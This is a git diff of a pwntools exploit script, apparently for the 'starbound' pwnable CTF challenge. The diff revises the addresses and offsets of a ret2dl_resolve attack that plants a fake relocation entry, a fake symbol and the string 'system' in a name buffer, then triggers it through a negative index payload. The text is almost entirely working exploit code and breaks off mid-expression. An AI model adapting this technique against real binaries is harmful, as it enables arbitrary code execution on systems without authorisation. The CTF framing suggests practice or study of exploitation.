@@ -16,9 +16,9 @@ def trigger(payload):
     p.sendlineafter('> ', payload)
 
 
-STRTAB_ADDR = 0x80484fc
-SYMTAB_ADDR = 0x80481dc
-REL_PLT_ADDR = 0x80487d0
+STRTAB_ADDR = 0x804628c
+SYMTAB_ADDR = 0x8047488
+REL_PLT_ADDR = 0x80487c8
 NAME_ADDR = 0x80580D0
 
 elf = ELF('/home/len/pwnable/starbound')
@@ -31,8 +31,9 @@ read_plt_addr = 0x8055054
 fake_rel_addr = NAME_ADDR + 0x8
 fake_rel_offset = fake_rel_addr - REL_PLT_ADDR
 
-fake_symbol_addr = fake_rel_addr + 0x8
-fake_symbol_index = (fake_symbol_addr - SYMTAB_ADDR) / 0x10
+fake_symbol_addr = fake_rel_addr + 0x8 + 0x8
+fake_symbol_offset = fake_symbol_addr - SYMTAB_ADDR
+fake_symbol_index = fake_symbol_offset / 0x10
 
 fake_str_addr = fake_symbol_addr + 0x10
 fake_str_offset = fake_str_addr - STRTAB_ADDR  # system
@@ -45,11 +46,16 @@ fake_str = 'system\x00'
 context.log_level = 'info'
 
 if __name__ == "__main__":
-    set_name(p32(gadget) + p32(0) + fake_rel + fake_symbol + fake_str)
+    set_name(
+        p32(gadget) + p32(0) + fake_rel + p32(0) * 2 + fake_symbol + fake_str)
 
     log.info("fake_rel_addr: {:#x}".format(fake_rel_addr))
     log.info("fake_symbol_addr: {:#x}".format(fake_symbol_addr))
     log.info("fake_str_addr: {:#x}".format(fake_str_addr))
+
+    log.info("fake_rel_offset: {:#x}".format(fake_rel_offset))
+    log.info("fake_symbol_offset: {:#x}".format(fake_symbol_offset))
+    log.info("fake_str_offset: {:#x}".format(fake_str_offset))
 
     pdb.set_trace()
     payload = str(-33) + '\x00' + 'a' * 4 + p32(ret_dl_resolve) + p32(
